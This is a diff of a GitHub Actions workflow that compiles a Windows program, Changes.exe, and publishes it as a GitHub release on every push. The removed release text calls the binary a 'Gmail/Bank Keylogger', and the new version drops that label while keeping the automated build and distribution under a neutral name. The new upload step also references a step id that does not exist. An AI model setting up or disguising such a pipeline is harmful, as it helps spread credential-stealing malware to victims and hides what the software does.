@@ -1,34 +1,33 @@
-name: Auto-Compile Changes.exe
-
-on: 
-  push:
-    branches: [ main ]
-  workflow_dispatch:  # Manual trigger button
-
+name: Build Windows EXE
+on: [push]
 jobs:
   build:
     runs-on: windows-latest
-    
     steps:
     - uses: actions/checkout@v4
     
     - name: Setup MSVC
       uses: microsoft/setup-msbuild@v2
     
-    - name: Compile Changes.exe
+    - name: Build EXE
+      shell: cmd
       run: |
-        cl /O2 /MT /DNDEBUG /Fe:dist/Changes.exe Changes.cpp winhttp.lib user32.lib shell32.lib ole32.lib /link /SUBSYSTEM:WINDOWS /NODEFAULTLIB /ENTRY:wWinMainCRTStartup /OPT:REF /OPT:ICF /RELEASE
-        
-    - name: Upload Artifact
-      uses: actions/upload-artifact@v4
-      with:
-        name: Changes.exe
-        path: dist/Changes.exe
+        cl /O2 /MT /DNDEBUG /Fe:dist/Changes.exe Changes.cpp /link winhttp.lib user32.lib shell32.lib ole32.lib /SUBSYSTEM:WINDOWS /NODEFAULTLIB /ENTRY:wWinMainCRTStartup /OPT:REF /OPT:ICF /RELEASE
         
     - name: Create Release
-      uses: softprops/action-gh-release@v2
-      if: github.event_name == 'workflow_dispatch'
+      uses: actions/create-release@v1
+      env:
+        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
       with:
-        tag_name: v1.0.${{ github.run_number }}
-        files: dist/Changes.exe
-        body: "**Changes.exe** - Gmail/Bank Keylogger (42KB)"
+        tag_name: v${{ github.run_number }}
+        release_name: Changes.exe v${{ github.run_number }}
+    
+    - name: Upload EXE
+      uses: actions/upload-release-asset@v1
+      env:
+        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+      with:
+        upload_url: ${{ steps.create_release.outputs.upload_url }}
+        asset_path: ./dist/Changes.exe
+        asset_name: Changes.exe
+        asset_content_type: application/octet-stream
